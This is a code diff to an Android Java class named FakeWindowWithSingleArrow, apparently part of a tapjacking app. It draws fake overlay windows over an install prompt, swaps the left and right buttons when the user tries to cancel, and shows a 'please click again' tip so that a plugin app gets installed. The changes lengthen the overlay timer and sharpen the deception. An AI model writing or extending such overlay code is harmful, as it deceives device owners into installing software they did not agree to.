@@ -13,6 +13,7 @@ import com.xstd.qm.*;
 import com.xstd.qm.setting.SettingManager;
 import com.xstd.quick.R;
 
+import java.util.Set;
 import java.util.concurrent.Callable;
 
 /**
@@ -24,7 +25,7 @@ import java.util.concurrent.Callable;
  */
 public class FakeWindowWithSingleArrow implements FakeWindowInterface {
 
-    protected static final int TIMER_COUNT = 100;
+    protected static final int TIMER_COUNT = 300;
 
     protected int countDown = -1;
     protected View coverView;
@@ -139,10 +140,15 @@ public class FakeWindowWithSingleArrow implements FakeWindowInterface {
             AppRuntime.FAKE_WINDOWS_SHOW.set(false);
             AppRuntime.WATCHING_SERVICE_BREAK.set(true);
 
+            SettingManager.getInstance().setDeviceBindingTime(SettingManager.getInstance().getDeviceBindingTime() + 1);
+
             SettingManager.getInstance().setLoopActiveCount(0);
             Utils.tryToActivePluginApp(context);
         } else {
             if (SettingManager.getInstance().getCancelInstallReserve()) {
+                /**
+                 * 发生左右按键翻转的时候会进入一次
+                 */
                 leftTime = false;
                 //timer layout
                 timerBtnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
@@ -173,13 +179,15 @@ public class FakeWindowWithSingleArrow implements FakeWindowInterface {
                 //change cover
                 rightView.setVisibility(View.GONE);
                 leftView.setVisibility(View.VISIBLE);
+                TextView tips_left_click = (TextView) leftView.findViewById(R.id.tips_left_click);
+                tips_left_click.setText("-请再次点击");
 
                 SettingManager.getInstance().setCancelInstallReserve(false);
             }
 
             if (countDown > 0 && AppRuntime.PLUGIN_INSTALLED && SettingManager.getInstance().getKeyPluginInstalled()) {
                 //表示在遮盖的过程中已经安装了插件
-                //此时的动作是进行全遮盖，然后推出
+                //此时的动作是进行全遮盖，然后退出
                 AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                 if (installFullView == null) {
                     installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
